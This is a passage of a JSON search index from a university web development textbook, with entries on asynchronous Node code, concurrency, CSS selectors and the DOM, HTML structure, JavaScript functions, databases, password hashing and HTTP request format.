the user. And you\u0026rsquo;re going to handle some form submission and actually storing data in the database. So again, it\u0026rsquo;s a much more fully featured web app than the previous milestones, but it is a lot more complex. So make sure you keep that in mind.\nThat\u0026rsquo;s really all I\u0026rsquo;ve got for this week. As always, if you have questions or concerns, you can chat with me on Discord anytime you can join Tea Time office hours, which are Tuesdays at 330 Fridays at 1030. You can schedule a one on one office hour with me using my Calendly link, you can send me an email, I\u0026rsquo;m always here and happy to help so if you ever have questions or you get stuck on something and you need a little bit extra help, please let me know so that I can help you out. Otherwise, I hope things are going well this week. I hope you\u0026rsquo;re not pulling your hair out too much with a really large milestone, but it does take a little bit effort. So make sure you keep that in mind. Hopefully have good luck with this milestone. As always, if you have any questions, let me know. And I will see you next week.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/y-announcements/old/summer2021/08-week8/",
	"title": "Week 7",
	"tags": [],
	"description": "",
	"content": " "
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/04-node/03-asynchronous-functions/",
	"title": "Asynchronous Functions",
	"tags": [],
	"description": "",
	"content": "The benefit of the asynchronous approach is that all user-written code runs in a single-threaded environment while avoiding blocking. This means for the most part, we can write code the way we are used to, with a few tweaks for asynchronous functions.\nConsider the two approaches for reading and printing the contents of a file, below:\nconst fs = require(\u0026#39;fs\u0026#39;); // Synchronous approach var data = fs.readFileSync(\u0026#39;file.txt\u0026#39;); console.log(data); // Asynchronous approach fs.readFile(\u0026#39;file.txt\u0026#39;, function(err, data){ console.log(data); }); In the synchronous function, the contents of the file are returned, and assigned to the variable data. Conversely, in the asynchronous approach the file contents are passed into a callback function that is invoked when the asynchronous process finishes (and when the callback phase of the Node event loop is reached). The function itself returns nothing (undefined in Node). The important difference between the two is in the first approach, the program waits for the file to be read. In the second, the program keeps executing lines of code after the asynchronous call, even though the file hasn\u0026rsquo;t been read yet.\nAsynchronous Callback Structure In most Node libraries, the callback function provided to the asynchronous function follows the same format - the first parameter is an error value, which will be populated with text or object if an error occurred, and otherwise will be a falsy value (a value that evaluates to false, like false, null, undefined, or 0). Successive arguments are the data the function was intended to retrieve - i.e. the contents of the file in the above example. Of course, if an error was encountered, the later values may be wrong. Thus, most programmers follow the pattern of checking for an error at the start of the callback, and halting execution if one is encountered. Rewriting the example above, we would see:\nfs.readFile(\u0026#34;file.txt\u0026#34;, function(err, data){ if(err) return console.error(err); console.log(data); }); If err is a truthy value (any non-falsy value, in this case an Exception object or a string), we log the error to the console and return, halting execution of the rest of the function.\nCommon Asynchronous Misconceptions It is very important to understand that the callback is executed at a future point in time, and execution continues to further lines of code. Consider this example:\nvar contents; fs.readFile(\u0026#34;example.txt\u0026#34;, function(err, data) { contents = data; }); console.log(contents); Assuming the file example.txt contains only the line \u0026quot;hello world\u0026quot;, what do you think is printed?\nYou might think that it would be \u0026quot;hello world\u0026quot;, but the console.log(data) happens before the callback function is executed, so it will be undefined. If you wanted to print the file contents, you would have to instead do something like:\nvar contents; fs.readFile(\u0026#34;example.txt\u0026#34;, function(err, data) { contents = data; console.log(contents); }); Because the logging now happens inside the callback value, it will only occur after the file has been read, and the results added to the event queue, which is where the contents variable is initialized.\nInfo\nPromises and the async/await keywords covered in the previous chapter are both attempts to sidestep these misconceptions by introducing new objects and syntax that provide more familiar abstractions to programmers.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/03-asynchronous-js/03-concurrency-challenges/",
	"title": "Concurrency Challenges",
	"tags": [],
	"description": "",
	"content": "Implementing concurrency in computing systems comes with some specific challenges. Consider the multitasking approach where we have your text editor and your music player running at the same time. As the text editor process yields to the music player, the data and program elements it had loaded up into working memory, needs to be cleared out and replaced with the music player\u0026rsquo;s data and program. However, the music player\u0026rsquo;s data and program need to be retained somewhere so that they can be swapped back in when the music player yields.\nModern operating systems handle this challenge by dividing working memory amongst all programs running (which is why the more programs you run, the more RAM you consume). Each running process is assigned a block of memory and only allowed to use that memory. Moreover, data copied into the CPU (the L2 cache, L1 cache, and registers) may also be cached in memory for later restoration. You\u0026rsquo;ll learn more about the details of this process if you take an Operating Systems course. But it is very important that each running program is only allowed to make changes in its own assigned memory space. If it wasn\u0026rsquo;t, it could overwrite the data of another task!\nInfo\nIn fact, an OS allowing a running program to overwrite another program\u0026rsquo;s assigned memory is a security vulnerability, as this can involve overwriting part of the other program, changing how it actually works! Viruses, trojans, and worms are often written to exploit this kind of vulnerability.\nWhile operating systems normally manage the challenges of concurrency between running programs, when the program itself is written to be concurrent, the program itself must be built to avoid accidentally overwriting its own memory in unexpected ways. Consider a text editor - it might have its main thread handling user input, and a second thread handling spell checking. Now the user has typed \u0026ldquo;A quick brow\u0026rdquo;, and the spell checker is finding that \u0026ldquo;brow\u0026rdquo; is misspelled. It might try to underline the line in red, but in the intervening time, the user has deleted \u0026ldquo;brow\u0026rdquo;, so the underlining is no longer valid!\nOr consider image data. Applying a filter to an image is a computationally costly operation - typically requiring visiting each pixel in the image, and for some filters, visiting each pixel around each pixel as part of the transformation. This would be a good use-case for multi-threading. But now imagine two filters working in parallel. One might be applying a blur, and the other a grayscale transformation. If they were overwriting the old image data with their new filtered version, and were working at the same time, they might both start from the original pixels in the upper-right-hand corner. The blur would take longer, as it needs to visit neighboring pixels. So the grayscale filter writes out the first hundred pixels, and then the blur writes out its first hundred, over-writing the grayed pixels with blurred color pixels. Eventually, the grayscale filter will get so far ahead of the blur filter that the blur filter will be reading in now-greyed out pixels, and blurring them. The result could well be a mishmash of blurred color and gray-and-white splotches.\nThere are many different approaches that can be used to manage this challenge. One is the use of locks - locking a section of memory so only one thread can access it while it makes changes. In the filter example, the grayscale filter could lock the image data, forcing the blur filter to wait until it finishes. Locks work well, but must be carefully designed to avoid race conditions - where two threads cannot move forward because the other thread has already locked a resource the blocked thread needs to finish its work.\nAsynchronous programming is another potential solution, which we\u0026rsquo;ll look at next.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/01-the-dom/03-css-and-the-dom/",
	"title": "CSS and the DOM",
	"tags": [],
	"description": "",
	"content": "Cascading style sheets (CSS) also interact with the DOM. Consider this CSS code:\n.banner { border: 4px solid gold; border-radius: 5rem; background-color: goldenrod; padding: 5rem; color: brown; } .banner \u0026gt; h1 { font-style: italic; } .banner p { text-decoration: line-through; font-size: 1.2rem; } When it is placed in the site.css file referenced by the HTML we discussed in the last section, the rules it defines are evaluated in terms of the DOM tree. The result is the page now looks like this:\nNow let\u0026rsquo;s talk about how this CSS code and the DOM interact.\nConsider the selector .banner. It looks for any element whose class attribute includes the string \u0026quot;banner\u0026quot;. Hence, it matches the \u0026lt;div\u0026gt; element, adding a color, background color, border, and padding. This visualization of the DOM tree indicates the selected node in yellow:\nNotice how the text in both the \u0026lt;h1\u0026gt; element and the \u0026lt;p\u0026gt; element are a reddish color? That color is the one defined in the .banner rule: color: #754907. The rule applies not only to the selected node, but to all its descendants in the DOM tree. This is the \u0026lsquo;cascading\u0026rsquo; part of cascading style sheets - the rules flow down the DOM tree until they are overridden by more specific css rules in descendant nodes.\nThe second way CSS interacts with the DOM tree is through the CSS selectors themselves.\nFor example, the selector .banner \u0026gt; h1 uses the child combinator - the \u0026gt; symbol between .banner and h1. This indicates that the rule will be applied to any \u0026lt;h1\u0026gt; nodes that are direct children of the node with the class of \u0026quot;banner\u0026quot;. As we can see from the DOM tree, the sole \u0026lt;h1\u0026gt; tag is a child of the \u0026lt;div.banner\u0026gt; node, so this rule is applied to it:\nSimilarly, the .banner p tag uses the descendant combinator - the space between the .banner and p. This indicates that the rule will be applied to any \u0026lt;p\u0026gt; nodes that are descended from the node with the class of \u0026quot;banner\u0026quot;. This will apply no matter how far down the tree those nodes appear. Thus, if we added more \u0026lt;p\u0026gt; elements inside of a \u0026lt;div\u0026gt; that was a child of the \u0026lt;div.banner\u0026gt; node, it would apply to them as well.\nYou can see the example with the styling applied by following this link. Try adding the div and two paragraphs with the developer tools. See how the styles are automatically applied to the new nodes in the DOM tree?\nCSS and Developer Tools Speaking of developer tools, there is another handy tab that deals with CSS, the \u0026lsquo;Styles\u0026rsquo; tab. It displays all the css rules applied to a specific node. Select one of your new \u0026lt;p\u0026gt; elements. Notice how the styles tab shows the css rule .banner p that we\u0026rsquo;ve been discussing? Moreover, it tells you which CSS file and which line in that file the rule is found on.\nIf you scroll down, it also shows you the rules inherited (cascaded) from the .banner rule:\nIf you scroll clear to the bottom, you will also see a visualization of the box model as it is applied to this element.\nThis can be very handy for debugging margin/padding/border issues.\nNow scroll back up to the top of the styles tab. Notice the element.style {} rule? This displays inline CSS on the element, and we can also add our own inline CSS directly from the developer tools. Add the property key/value pair text-decoration: none. Notice what happens to the paragraph\u0026rsquo;s text? Also, notice how the now overridden rule has been struck through in the rule below.\nThis can be very handy for quickly trying out different style combinations without needing to add them to the CSS file. Much like changes to the DOM, these are not saved - refresh the page and they are gone.\nFinally, notice that when the mouse hovers over a CSS property key/value pair, a checkbox appears next to it? If you uncheck the box, the property ceases to be applied. This can also be very handy for debugging CSS problems.\nNow that we\u0026rsquo;ve seen how CSS interacts with the DOM tree, it\u0026rsquo;s time to turn our attention to the third web technology - JavaScript.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/b-css/03-selectors/",
	"title": "CSS Selectors",
	"tags": [],
	"description": "",
	"content": "In the example from the previous section, we saw:\np { color: red; background-color: green; } Here the p is a CSS Selector, which tells us what elements on the page the CSS rules should be applied to.\nSimple Selectors The most basic CSS selectors come in several flavors, which we\u0026rsquo;ll take a look at next. Simple selectors are a string composed of alphanumeric characters, dashes (-), and underscores (_). Certain selectors also use additional special characters.\nType Selector Type selectors apply to a specific type of HTML element. The p in our example is a type selector matching the paragraph element.\nA type selector is simply the name of the HTML element it applies to - the tag name from our discussion of HTML element structure.\nClass Selector A class selector is a proceeded by a period (.), and applies to any HTML element that has a matching class attribute. For example, the CSS rule:\n.danger { color: red; } would apply to both the paragraph and button elements:\n\u0026lt;h1\u0026gt;Hello\u0026lt;/h1\u0026gt; \u0026lt;p class=\u0026#34;danger\u0026#34;\u0026gt;You are in danger\u0026lt;/p\u0026gt; \u0026lt;button class=\u0026#34;danger\u0026#34;\u0026gt;Don\u0026#39;t click me!\u0026lt;/button\u0026gt; as both have the class danger. A HTML element can have multiple classes applied, just separate each class name with a space:\n\u0026lt;p class=\u0026#34;danger big-text\u0026#34;\u0026gt;I have two classes!\u0026lt;/p\u0026gt; ID Selector An ID selector is proceeded by a hash (#) and applies to the HTML element that has a matching id attribute. Hence:\n\u0026lt;p id=\u0026#34;lead\u0026#34;\u0026gt;This paragraph has an id of \u0026#34;lead\u0026#34;\u0026lt;/p\u0026gt; would be matched by:\n#lead { font-size: 16pt; } It is important to note that the id attribute should be unique within the page. If you give the same id to multiple elements, the results will be unpredictable (and doing so is invalid HTML).\nUniversal Selector The asterisk (*) is the universal selector, and applies to all elements. It is often used as part of a reset - CSS rules appearing at the beginning of a CSS document to remove browser-specific styles before applying a site\u0026rsquo;s specific ones. For example:\n* { margin: 0; padding: 0; } sets all element margins and paddings to 0 instead of a browser default. Later rules can then apply specific margins and padding.\nAttribute Selector The attribute selector is wrapped in square brackets ([]) and selects HTML elements with matching attribute values, i.e.:\n[readonly] { color: gray; } will make any element with a readonly attribute have gray text. The value can also be specified exactly, i.e.\n[href=\u0026#34;www.k-state.edu\u0026#34;] or partially. See MDN\u0026rsquo;s documentation for details.\nCompound Selectors Simple selectors can be used in conjunction for greater specificity. For example, a.external-link selects all \u0026lt;a\u0026gt; elements with a class of external-link, and input[type=checkbox] selects all \u0026lt;input\u0026gt; elements with an attribute type set to checkbox.\nPseudo-Class Pseudo-class selectors are proceeded with a single colon (:), and refer to the state of the element they modify. Pseudo-classes must therefore be appended to a selector.\nThe most commonly used pseudo-class is :hover, which is applied to an element that the mouse is currently over. Moving the mouse off the element will make this selector no longer apply. For example, a:hover applies only to \u0026lt;a\u0026gt; elements with the mouse directly over them.\nAnother extremely useful pseudo-class is :nth-child(), which applies to the nth child (specify as an argument), i.e. ul:nth-child(2) will apply to the second child of any unordered list. Additionally, tr:nth-child(odd) will apply to the odd-numbered rows of a table.\nAdditional pseudo-classes can be found in the MDN documentation\nCombinators Combinators can be used to combine both simple and compound selectors using an operator.\nAdjacent Sibling Combinator The plus symbol (+) can be used to select an adjacent sibling HTML element. To be siblings, the first element must be followed by the second, and both must be children of a shared parent. I.e.:\nh1 + p { font-weight: bold; } will bold all paragraphs that directly follow a first-level header.\nGeneral Sibling Combinator The tilde symbol (~) also selects a sibling, but they do not need to be adjacent, just children of the same parent. The first element must still appear before the second (just not immediately after).\nChild Combinator The greater than symbol (\u0026gt;) selects elements that are direct children of the first element. For example:\np \u0026gt; a { font-weight: bold; } Will bold all anchor elements that are direct children of a paragraph element.\nDescendant Combinator A space ( ) selects elements that are descendants of the first element.\nMultiple Selectors Finally, we can apply the same rules to a collection of selectors by separating the selectors with commas, i.e.:\na, p, span { font-family: \u0026#34;Comic Sans\u0026#34;, sans-serif; } Applies Comic Sans as the font for all \u0026lt;a\u0026gt;, \u0026lt;p\u0026gt;, and \u0026lt;span\u0026gt; elements.\nPseudo-Elements An interesting newer development in CSS is the development of psuedo-elements, selectors that go beyond the elements included in the HTML of the page. They are proceeded by two colons (::). For example, the ::first-letter selector allows you to change the first letter of a HTML element. Thus:\np:first-child::first-letter { font-size: 20px; font-weight: bold; float: left; } creates drop caps for all initial paragraphs.\nA second use of pseudo-elements is to create new elements around existing ones with ::before or ::after. For example:\na.external-link::after { content: url(external-link-icon.png); } Would add the external-link-icon.png image after any \u0026lt;a\u0026gt; elements with the external-link class.\nMore information can be found in the MDN Documentation.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/07-persistent-storage/03-databases/",
	"title": "Databases",
	"tags": [],
	"description": "",
	"content": "As we suggested in the previous section, using an already existing database application is a very common strategy for full-stack web development. Doing so has clear benefits - such programs are typically stable, secure, and optimized for data storage and retrieval. They are well beyond what we can achieve ourselves without a significant investment of time, and avoids the necessity of \u0026ldquo;reinventing the wheel\u0026rdquo;.\nThat said, making effective use of a third-party database system does require you to develop familiarity with how the database operates and is organized. Gaining the benefits of a database\u0026rsquo;s optimizations requires structuring your data in the way its developers anticipated, and likewise retrieving it in such a manner. The exact details involved vary between database systems and are beyond the scope of this course, which is why you have a database course in your required curriculum. Here I will just introduce the details of how to integrate the use of a database into your web development efforts, and I\u0026rsquo;ll leave the learning of how to best optimize your database structure and queries for that course.\nIn the web development world, we primarily work with two kinds of databases, which have a very different conceptual starting point that determines their structure. These are Relational Databases and Document-oriented Databases (sometimes called No-SQL databases). There is a third category, Object-oriented Databases that are not widely adopted, and a slew of less-well known and utilized technologies. There are also cloud services that take over the role traditionally filled by databases, which we\u0026rsquo;ll save for a later chapter. For now, we\u0026rsquo;ll focus on the first two, as these are the most commonly adopted in the web development industry.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/a-html/03-html-document-structure/",
	"title": "HTML Document Structure",
	"tags": [],
	"description": "",
	"content": "When authoring an HTML page, HTML elements should be organized into an HTML Document. This format is defined in the HTML standard. HTML that does not follow this format are technically invalid, and may not be interpreted and rendered correctly by all browsers. Accordingly, it is important to follow the standard.\nThe basic structure of a valid HTML5 document is:\n\u0026lt;!doctype HTML\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Page Title Goes Here\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;Page body and tags go here...\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; We\u0026rsquo;ll walk through each section of the page in detail.\nDoctype The SGML standard that HTML is based on requires a !doctype tag to appear as the first tag on the page. The doctype indicates what kind of document the file represents. For HTML5, the doctype is simply HTML. Note the doctype is not an element - it has no closing tag and is not self-closing.\nInfo\nFor SGML, the doctype normally includes a URL pointing at a definition for the specific type of document. For example, in HTML4, it would have been \u0026lt;!DOCTYPE HTML PUBLIC \u0026quot;-//W3C//DTD HTML 4.01//EN\u0026quot; \u0026quot;http://www.w3.org/TR/html4/strict.dtd\u0026quot;\u0026gt;. HTML5 broke with the standard by only requiring HTML be included, making the doctype much easier to remember and type.\nHTML Element The next element should be an \u0026lt;html\u0026gt; element. It should include all other elements in the document, and its closing tag should be the last tag on the page. It is best practice to include a lang attribute to indicate what language is used in the document - here we used \u0026quot;en\u0026quot; for English. The \u0026lt;html\u0026gt; element should only contain two children - a \u0026lt;head\u0026gt; and \u0026lt;body\u0026gt; tag in that order.\nInfo\nThe list of valid langauge subtags are maintained by the Internet Assigned Numbers Authority (IANA), which also oversees domains and IP addresses. The full list can be reached here.\nThe Head Element The next element is the \u0026lt;head\u0026gt; element. A valid HTML document will only have one head element, and it will always be the first child of the \u0026lt;html\u0026gt; element. The head section contains metadata about the document - information about the document that is not rendered in the document itself. This typically consists of meta and link elements, as well as a \u0026lt;title\u0026gt;. Traditionally, \u0026lt;script\u0026gt; elements would also appear here, though current best practice places them as the last children of the \u0026lt;body\u0026gt; tag.\nThe Title Element The \u0026lt;head\u0026gt; element should always have exactly one child \u0026lt;title\u0026gt; element, which contains the title of the page (as text; the \u0026lt;title\u0026gt; element should never contain other HTML elements). This title is typically displayed in the browser tab.\nThe Body Element The next element is the \u0026lt;body\u0026gt; element. A valid HTML document will only have one body element, and it will always be the second child of the \u0026lt;html\u0026gt; element. The \u0026lt;body\u0026gt; tag contains all the HTML elements that make up the page. It can be empty, though that makes for a very boring page.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/c-js/03-functions/",
	"title": "JavaScript Functions",
	"tags": [],
	"description": "",
	"content": " CONSOLE While JavaScript may look like an imperative language on the surface, much of how it behaves is based on functional languages like Scheme. This leads to some of the common sources of confusion for programmers new to the language. Let\u0026rsquo;s explore just what its functional roots mean.\nJavaScript implements first-class functions, which means they can be assigned to a variable, passed as function arguments, returned from other functions, and even nested inside other functions. Most of these uses are not possible in a traditional imperative language, though C# and Java have been adding more functional-type behavior.\nDefining Functions Functions in JavaScript are traditionally declared using the function keyword, followed by an identifier, followed by parenthesized arguments, and a body enclosed in curly braces, i.e.:\nfunction doSomething(arg1, arg2, arg3) { // Do something here... } Alternatively, the name can be omitted, resulting in an anonymous function:\nfunction (arg1, arg2, arg3) { // Do something here... } Finally ES6 introduced the arrow function syntax, a more compact way of writing anonymous functions, similar to the lambda syntax of C#:\n(arg1, arg2, arg3) =\u0026gt; { // Do something here... } However, arrow function syntax also has special implications for scope, which we will discuss shortly.\nInvoking Functions Functions are invoked with a parenthetical set of arguments, i.e.\nfunction sayHello(name) { console.log(`Hello, ${name}`); } Go ahead and define this function by typing the definition into your console.\nOnce you\u0026rsquo;ve done so, it can be invoked with sayHello(\u0026quot;Bob\u0026quot;), and would print Hello, Bob to the console. Give it a try:\nFunctions can also be invoked using two methods defined for all functions, call() and apply().\nFunction Arguments One of the bigger differences between JavaScript and imperative languages is in how JavaScript handles arguments. Consider the hello() function we defined above. What happens if we invoke it with no arguments? Or if we invoke it with two arguments?\nGive it a try:\nsayHello() sayHello(\u0026#34;Mary\u0026#34;, \u0026#34;Bob\u0026#34;); What are we seeing here? In JavaScript, the number of arguments supplied to a function when it is invoked is irrelevant. The same function will be invoked regardless of the arity (number) or type of arguments. The supplied arguments will be assigned to the defined argument names within the function\u0026rsquo;s scope, according to the order. If there are less supplied arguments than defined ones, the missing ones are assigned the value undefined. And if there are extra arguments supplied, they are not assigned to a value.\nCan we access those extra arguments? Yes, because JavaScript places them in a variable arguments accessible within the function body. Let\u0026rsquo;s modify our sayHello() method to take advantage of this knowledge, using the for .. of loop we saw in the last section:\nfunction sayHello() { for(name of arguments) { console.log(`Hello, ${name}`); } } And try invoking it with an arbtrary number of names:\nsayHello(\u0026#34;Mike\u0026#34;, \u0026#34;Mary\u0026#34;, \u0026#34;Bob\u0026#34;, \u0026#34;Sue\u0026#34;); Warning\nJavaScript does not have a mechanism for function overloading like C# and Java do. In JavaScript, if you declare a second \u0026ldquo;version\u0026rdquo; of a function that has different named arguments, you are not creating an overloaded version - you\u0026rsquo;re replacing the original function!\nThus, when we entered our second sayHello() definition in the console, we overwrote the original one. Each function name will only reference a single definition at a time within a single scope, and just like with variables, we can change its value at any point.\nFinally, because JavaScript has first-order functions, we can pass a function as an argument. For example, we could create a new function, greet() that takes the greeter\u0026rsquo;s name, a function to use to greet others, and uses the arguments to greet an arbitrary number of people:\nfunction greet(name, greetingFn) { for(var i = 2; i \u0026lt; arguments.length; i++) { greetingFn(arguments[i]); } console.log(`It\u0026#39;s good to meet you. I\u0026#39;m ${name}`); } We can then use it by passing our sayHello() function as the second argument:\ngreet(\u0026#34;Mark\u0026#34;, sayHello, \u0026#34;Joe\u0026#34;, \u0026#34;Jill\u0026#34;, \u0026#34;Jack\u0026#34;, \u0026#34;John\u0026#34;, \u0026#34;Jenny\u0026#34;); Note that we don\u0026rsquo;t follow the function name with the parenthesis (()) when we pass it. If we did, we\u0026rsquo;d inovke the function at that point and what we\u0026rsquo;d pass was the return value of the function, not the function itself.\nReturn Values Just like the functions you\u0026rsquo;re used to, JavaScript functions can return a value with the return statement, i.e.:\nfunction foo() { return 3; } We can also return nothing, which is undefined:\nfunction bar() { return; } This is useful when we want to stop execution immediately, but don\u0026rsquo;t have a real return value. Also, if we don\u0026rsquo;t specify a return value, we implicity return undefined.\nAnd, because JavaScript has first-order functions, we can return a function:\nfunction giveMeAFunction() { return function() { console.log(\u0026#34;Here I am!\u0026#34;) } } Function Variables Because JavaScript has first-order functions, we can also assign a function to a variable, i.e.:\nvar myFn = function(a, b) {return a + b;} var greetFn = greet; var otherFn = (a, b) =\u0026gt; {return a - b;} var oneMoreFn = giveMeAFunction(); Functional Scope We\u0026rsquo;ve mentioned scope several times now. Remember, scope simply refers to where a binding between a symbol and a value is valid (here the symbol could be a var or function name). JavaScript uses functional scope, which means a new scope is created within the body of every function. Moreover, the parent scope of that function remains accessible as well.\nConsider the JavaScript code:\nvar a = \u0026#34;foo\u0026#34;; var b = \u0026#34;bar\u0026#34;; console.log(\u0026#34;before coolStuff\u0026#34;, a, b); function coolStuff(c) { var a = 1; b = 4; console.log(\u0026#34;in coolStuff\u0026#34;, a, b, c); } coolStuff(b); console.log(\u0026#34;after coolStuff\u0026#34;, a, b); What gets printed before, in, and after coolStuff()?\nBefore we invoke coolStuff() the values of a and b are \u0026quot;foo\u0026quot; and \u0026quot;bar\u0026quot; respectively. Inside the body of coolStuff(): The named argument c is assigned the value passed when coolStuff() is invoked - in this case, the value of b at the time, \u0026quot;bar\u0026quot;. A new variable a is declared, and set to a value of 1. This a only exists within coolStuff(), the old a remains unchanged outside of the function body. The value of 4 is assigned to the variable b. Note that we did not declare a new var, so this is the same b as outside the body of the function. After the function is invoked, we go back to our original a which kept the value \u0026quot;foo\u0026quot; but our b was changed to 4. That may not seem to bad. But let\u0026rsquo;s try another example:\nvar a = 1; function one() { var a = 2; function two() { var a = 3; function three() { var a = 4; } three(); } } Here we have nested functions, each with its own scope, and its own variable a that exists for that scope.\nBlock Scope Most imperative programming langauges use block scope, which creates a new scope within any block of code. This includes function bodies, but also loop bodies and conditional blocks. Consider this snippet:\nfor(var i = 0; i \u0026lt; 10; i++) { var j = i; } console.log(j); What will be printed for the value of j after the loop runs?\nYou might think it should have been undefined, and it certainly would have been a null exception in an imperative language like Java, as the variable j was defined within the block of the for loop. Because those languages have block scope, anything declared within that scope only exists there.\nHowever, with JavaScript\u0026rsquo;s functional scope, a new scope is only created within the body of a function - not loop and conditional blocks! So anything created within a conditional block actually exists in the scope of the function it appears in. This can cause some headaches.\nTry running this (admittedly contrived) example in the console:\nfor(var i = 0; i \u0026lt; 10; i++) { setTimeout(function() { console.log(i); }, 10); } The setTimeout() will trigger the supplied function body 10 ms in the future.\nNotice how all the values are 10? That\u0026rsquo;s because we were accessing the same variable i, because it was in the same scope each time!\nThe keyword let was introduced in ES6 to bring block scope to JavaScript. If we use it instead, we see the behavior we\u0026rsquo;re more used to:\nfor(let i = 0; i \u0026lt; 10; i++) { setTimeout(function() { console.log(i); }, 10); } "
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/09-auth/03-password-auth/",
	"title": "Password Authentication",
	"tags": [],
	"description": "",
	"content": "One of the more common approaches used in modern dynamic webservers - especially those that are already using a database - is to have each user create an account and log in with a username and password. The primary difference in this approach from the HTTP Basic one is that:\nThe webserver provides a login page with a form for submitting the username/password (allowing it to be customized to match the site) On an successful authentication, a cookie is used to persist the user\u0026rsquo;s session, rather than re-submitting the Authentication header The actual difference in your server code between the two approaches is not that large.\nStoring User Credentials In either case, it is necessary for the server to be able to verify that the user\u0026rsquo;s supplied credentials are correct. For most database-backed dynamic webservers, this is accomplished by having a users table that stores the username, and an transformed version of the password. This transformation is usually accomplished through the use of a cryptographic hash function. This is a function that converts a string into a sequence of bytes that are very different from the source string. It is also a function that is extremely difficult to reverse i.e. it is difficult to figure out what the original string was from the hashed results.\nWhen authenticating the user, the password supplied by the user is hashed using the same function, and the resulting hash is compared to the one stored in the database. If they match, the user is confirmed, and can be logged in.\nThe reason we store passwords only in this encrypted form is that if an adversary was able to compromise our database and obtain the users table, they still wouldn\u0026rsquo;t know the users\u0026rsquo; passwords. Even with the contents of the database, the adversary would not be able to log in to our server as the user. And, as most users use the same password and email for multiple sites, this gives them some additional protection.\nIn fact, current best practice is to do more than just encrypt the password - we also use salt and multiple hashing rounds.\nSalting a Password Salting a password simply means to append a series of characters to the user\u0026rsquo;s password before hashing it. This helps avoid rainbow table attacks, where an adversary uses a list of prehashed commonly-used passwords. Since many users adopt simple passwords like 1234, secret, etc., it is a good bet that if you do obtain a list of usernames and their hashed passwords, you can find some matches. Appending the additional characters (usually in the form of random bytes) can prevent this. For an even stronger approach, two salts can be used - one stored as an server or environment variable, and one randomly generated per user and stored in the users table. Thus, the adversary would need to obtain access to both the database and the source code or server environment, making attacks more difficult.\nMultiple Hashing Rounds Unfortunately, computing hardware has advanced to the point that brute force attacks have become more than plausible. In a brute-force approach, permutations of characters are hashed until a match is found. A cluster of off-the-shelf graphics cards can make as many as 350 billion guesses each second. The defense against this approach is to make it take longer. Cryptographic hash functions like Bcrypt allow the hashing to be performed in multiple iterations. Adding more iterations makes the encryption process take longer - and therefore slows down any brute-force attack replicating the hashing function.\nThe downside is that it takes longer to log a user in using this strategy, but it provides about the best protection that we as web developers can offer. Incidentally, this is another reason to only authenticate the user once, rather than on every request (as is the case with HTTP authentication). To be able to store the user\u0026rsquo;s authentication however, we must maintain some form of session.\nUser Sessions This brings us to the second half of the username/password approach - we have to implement some form of user session. To do user sessions, we must also employ cookies. By their nature, cookies are not as secure as we might like, but there are some strategies we can use to make them more secure. First, we should specify the cookies using the Secure and HttpOnly attributes, and the SameSite attribute set to Strict. Moreover, the values set in the cookie should also be encrypted before being set (in this case, with a two-way encryption). Commonly, only the session id or user id will be included in the cookie, while the actual session data will be stored server-side in memory or in a sessions table.\nWarning\nAs with HTTP Authentication (and indeed, all authentication approaches) password-based authentication should only be used with HTTPS connections.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/02-http/03-request-format/",
	"title": "Request Format",
	"tags": [],
	"description": "",
	"content": "So now that we\u0026rsquo;ve seen HTTP Requests in action, let\u0026rsquo;s examine what they are. A HTTP Request is just a stream text that follows a specific format and sent from a client to a server.\nIt consists of one or more lines terminated by a CRLF (a carriage return and a line feed character, typically written \\r\\n in most programming languages).\nA request-line describing the request Additional optional lines containing HTTP headers. These specify details of the request or describe the body of the request A blank line, which indicates the end of the request headers An optional body, containing any data belonging of the request, like a file upload or form submission. The exact nature of the body is described by the headers. The Request-Line The request-line follows the format\nRequest-Line = Method SP Request-URI SP HTTP-Version CRLF\nThe Method refers to the HTTP Request Method (often GET or POST).\nSP refers to the space character.\nThe Request-URI is a Universal Request Indicator, and is typically a URL or can be the asterisk character (*), which refers to the server instead of a specific resource.\nHTTP-Version refers to the version of the HTTP protocol that will be used for the request. Currently three versions of the protocol exist: HTTP/1.0, HTTP/1.1, and HTTP/2.0. Most websites currently use HTTP/1.1 (HTTP/2.0 introduces many changes to make HTTP more efficient, at the cost of human readability. Currently it is primarily used by high-traffic websites).\nFinally, the CRLF indicates a carriage return followed by a line feed.\nFor example, if we were requesting the about.html page of a server, the request-line string would be:\nGET /about.html HTTP/1.1\\r\\n\nThe Headers Header lines consist of key-value pairs, typically in the form\nHeader = Key: Value CRLF\nHeaders provide details about the request, for example, if we wanted to specify we can handle the about.html page data compressed with the gzip algorithm, we would add the header:\nAccept-Encoding: compress, gzip\\r\\n\nThe server would then know it could send us a zipped version of the file, resulting in less data being sent from the server to the client.\nIf our request includes a body (often form data or a file upload), we need to specify what that upload data is with a Content-Type header and its size with a Content-Length header, i.e.:\nContent-Length: 26012 Content-Type: image/gif\nA Blank Line The header section is followed by a blank line (a CRLF with no characters before it). This helps separate the request metadata from the request body.\nThe Request Body The body of the request can be text (as is the case for most forms) or binary data (as in an image upload). This is why the Content-Type header is so important for requests with a body; it lets the server know how to process the data. Similarly, the Content-Length header lets us know how many bytes to expect the body to consist of.\nIt is also acceptable to have no body - this is commonly the case with a GET request. If there is no body, then there are also no required headers. A simple get request can therefore consist of only the request-line and blank line, i.e.:\nGET /about.html HTTP/1.1\\r\\n\\r\\n\nInfo\nThe HTTP/1.1 request definition can be found in W3C RFC 2616 Section 5\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/05-web-servers/03-request-handling/",
	"title": "Request Handling",
	"tags": [],
	"description": "",
